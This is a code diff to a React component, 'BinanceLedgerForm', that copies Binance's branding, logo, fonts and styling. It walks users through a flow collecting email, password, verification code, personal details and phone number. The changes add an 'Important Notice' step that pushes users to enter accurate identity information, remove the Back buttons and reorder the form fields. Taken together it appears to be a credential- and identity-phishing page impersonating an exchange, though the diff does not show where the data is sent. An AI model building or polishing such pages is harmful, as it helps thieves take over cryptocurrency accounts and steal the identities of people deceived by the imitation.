@@ -1,8 +1,9 @@
+
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { Lock } from "lucide-react";
 
-type FormStep = 'email' | 'password' | 'verification' | 'personal-details' | 'success';
+type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'success';
 
 const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
@@ -68,6 +69,10 @@ const BinanceLedgerForm: FC = () => {
     setIsLoading(true);
     await new Promise(resolve => setTimeout(resolve, 2000));
     setIsLoading(false);
+    setCurrentStep('important-notice');
+  };
+
+  const handleNoticeConfirm = () => {
     setCurrentStep('personal-details');
   };
 
@@ -404,7 +409,7 @@ const BinanceLedgerForm: FC = () => {
         </div>
       </div>
 
-      <div className="flex justify-between items-center mb-8">
+      <div className="mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
           role="heading" 
@@ -419,13 +424,6 @@ const BinanceLedgerForm: FC = () => {
         >
           Enter Password
         </div>
-        <button 
-          onClick={() => setCurrentStep('email')}
-          className="text-sm hover:underline"
-          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
-        >
-          Back
-        </button>
       </div>
 
       <form onSubmit={handlePasswordSubmit}>
@@ -527,7 +525,7 @@ const BinanceLedgerForm: FC = () => {
         </div>
       </div>
 
-      <div className="flex justify-between items-center mb-8">
+      <div className="mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
           role="heading" 
@@ -542,17 +540,10 @@ const BinanceLedgerForm: FC = () => {
         >
           Enter Verification Code
         </div>
-        <button 
-          onClick={() => setCurrentStep('password')}
-          className="text-sm hover:underline"
-          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
-        >
-          Back
-        </button>
       </div>
 
       <div 
-        className="mb-6"
+        className="mb-4"
         style={{ 
           color: "var(--color-SecondaryText, #B7BDC6)",
           fontFamily: "BinanceNova, Arial, sans-serif",
@@ -670,6 +661,76 @@ const BinanceLedgerForm: FC = () => {
     </>
   );
 
+  const renderImportantNoticeStep = () => (
+    <>
+      <div className="flex justify-start mb-8">
+        <div className="flex items-center">
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
+            alt="Binance Logo" 
+            className="h-8"
+            onError={(e) => {
+              setLogoError(true);
+              e.currentTarget.style.display = 'none';
+            }}
+          />
+          {logoError && (
+            <span className="text-binance-yellow font-bold text-xl">
+              BINANCE
+            </span>
+          )}
+        </div>
+      </div>
+
+      <div className="text-center py-8">
+        <div 
+          className="mb-6 text-center"
+          style={{ 
+            color: "var(--color-PrimaryText, #EAECEF)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "32px",
+            fontWeight: "600",
+            lineHeight: "40px"
+          }}
+        >
+          ⚠️ Important Notice
+        </div>
+        
+        <div 
+          className="mb-8 text-left p-6 rounded-lg"
+          style={{ 
+            backgroundColor: "var(--color-Input, #2B3139)",
+            border: "1px solid var(--color-InputLine, #474D57)",
+            color: "var(--color-SecondaryText, #B7BDC6)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "14px",
+            fontWeight: "400",
+            lineHeight: "20px"
+          }}
+        >
+          Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+        </div>
+        
+        <button
+          onClick={handleNoticeConfirm}
+          className="bn-button bn-button__primary data-size-large w-full py-3 rounded transition-colors"
+          style={{
+            backgroundColor: "var(--color-BtnBg, #FCD535)",
+            color: "var(--color-TextOnYellow, #202630)",
+            fontFamily: "BinanceNova, Arial, sans-serif",
+            fontSize: "14px",
+            fontWeight: "500",
+            lineHeight: "20px",
+            height: "48px"
+          }}
+          aria-label="I Understand"
+        >
+          I Understand
+        </button>
+      </div>
+    </>
+  );
+
   const renderPersonalDetailsStep = () => (
     <>
       <div className="flex justify-start mb-8">
@@ -691,7 +752,7 @@ const BinanceLedgerForm: FC = () => {
         </div>
       </div>
 
-      <div className="flex justify-between items-center mb-8">
+      <div className="mb-8">
         <div 
           className="card-page-title !mb-[0px]" 
           role="heading" 
@@ -706,17 +767,10 @@ const BinanceLedgerForm: FC = () => {
         >
           Verify Details
         </div>
-        <button 
-          onClick={() => setCurrentStep('verification')}
-          className="text-sm hover:underline"
-          style={{ color: "var(--color-TertiaryText, #848E9C)" }}
-        >
-          Back
-        </button>
       </div>
 
       <form onSubmit={handlePersonalDetailsSubmit}>
-        <div className="space-y-4">
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           <div className="bn-formItem">
             <label 
               className="bn-formItem-label block mb-2" 
@@ -829,6 +883,43 @@ const BinanceLedgerForm: FC = () => {
           </div>
 
           <div className="bn-formItem">
+            <label 
+              className="bn-formItem-label block mb-2" 
+              style={{ 
+                color: "var(--color-PrimaryText, #EAECEF)",
+                fontFamily: "BinanceNova, Arial, sans-serif",
+                fontSize: "14px",
+                fontWeight: "400",
+                lineHeight: "20px"
+              }}
+            >
+              Phone Number
+            </label>
+            <div 
+              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
+              style={{
+                backgroundColor: "var(--color-Input, #2B3139)",
+                border: "1px solid var(--color-InputLine, #474D57)",
+                height: "48px"
+              }}
+            >
+              <input
+                type="tel"
+                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
+                style={{ 
+                  color: "var(--color-PrimaryText, #EAECEF)",
+                  fontFamily: "BinanceNova, Arial, sans-serif",
+                  fontSize: "14px",
+                  fontWeight: "400",
+                  lineHeight: "20px"
+                }}
+                value={personalDetails.phoneNumber}
+                onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
+              />
+            </div>
+          </div>
+
+          <div className="bn-formItem md:col-span-2">
             <label 
               className="bn-formItem-label block mb-2" 
               style={{ 
@@ -975,43 +1066,6 @@ const BinanceLedgerForm: FC = () => {
               />
             </div>
           </div>
-
-          <div className="bn-formItem">
-            <label 
-              className="bn-formItem-label block mb-2" 
-              style={{ 
-                color: "var(--color-PrimaryText, #EAECEF)",
-                fontFamily: "BinanceNova, Arial, sans-serif",
-                fontSize: "14px",
-                fontWeight: "400",
-                lineHeight: "20px"
-              }}
-            >
-              Phone Number
-            </label>
-            <div 
-              className="bn-textField bn-textField__line data-size-large css-8x1t0r rounded"
-              style={{
-                backgroundColor: "var(--color-Input, #2B3139)",
-                border: "1px solid var(--color-InputLine, #474D57)",
-                height: "48px"
-              }}
-            >
-              <input
-                type="tel"
-                className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-full text-sm leading-5"
-                style={{ 
-                  color: "var(--color-PrimaryText, #EAECEF)",
-                  fontFamily: "BinanceNova, Arial, sans-serif",
-                  fontSize: "14px",
-                  fontWeight: "400",
-                  lineHeight: "20px"
-                }}
-                value={personalDetails.phoneNumber}
-                onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
-              />
-            </div>
-          </div>
         </div>
 
         <button
@@ -1092,6 +1146,8 @@ const BinanceLedgerForm: FC = () => {
         return renderPasswordStep();
       case 'verification':
         return renderVerificationStep();
+      case 'important-notice':
+        return renderImportantNoticeStep();
       case 'personal-details':
         return renderPersonalDetailsStep();
       case 'success':
